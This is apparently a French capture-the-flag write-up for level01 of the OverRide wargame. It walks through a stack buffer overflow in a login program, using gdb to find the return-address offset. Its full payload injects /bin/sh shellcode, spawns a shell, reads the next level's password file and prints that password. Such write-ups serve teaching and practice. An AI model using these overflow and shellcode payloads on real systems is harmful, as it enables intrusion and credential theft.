# Level 01

Voici le code source de ce niveau:

```C
#include <stdio.h>
#include <string.h>
#include <strings.h>

char a_user_name[256];

int verify_user_name(char *username)
{
    return strncmp(username, "dat_wil", 7);
}

int verify_user_pass(char *pass)
{
    return strncmp(pass, "admin", 5);
}

int main(void)
{
    char buff[64];
    int pass_result;

    bzero(buff, 64);
    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(a_user_name, 256, stdin);
    if (verify_user_name(a_user_name) != 0)
    {
        puts("nope, incorrect username...\n");
        return 1;
    }
    puts("Enter Password: ");
    fgets(buff, 100, stdin);
    pass_result = verify_user_pass(buff);
    if (pass_result || pass_result == 0)
    {
        puts("nope, incorrect password...\n");
        return 1;
    }
    return 0;
}
```

L'idee ici est de stocker un shellcode dans `a_user_name` puis d'ecraser l'adresse de retour de `main()` pour executer notre shellcode. Donc voici comment on va remplir le buffer `a_user_name`:

```bash
python -c 'print "dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'
```

Ensuite il nous faut l'adresse de notre buffer (auquel on va faire +7 pour echapper les premiers characteres).

```bash
level01@OverRide:~$ objdump -t ./level01 | grep a_user_name
0804a040 g     O .bss   00000064              a_user_name
```

Il nous faut egalement l'offset auquel ecrire cette adresse:

```bash
level01@OverRide:~$ gdb ./level01
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? () # 6Ac7 -> Offset 80
```

Nous avons donc la deuxieme partie de notre payload:

```bash
python -c 'print "A" * 80 + "\x47\xa0\x04\x08"'
```

Voici donc le payload complet:

```bash
level01@OverRide:~$ (python -c 'print "dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' ; python -c 'print "A" * 80 + "\x47\xa0\x04\x08"' ; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
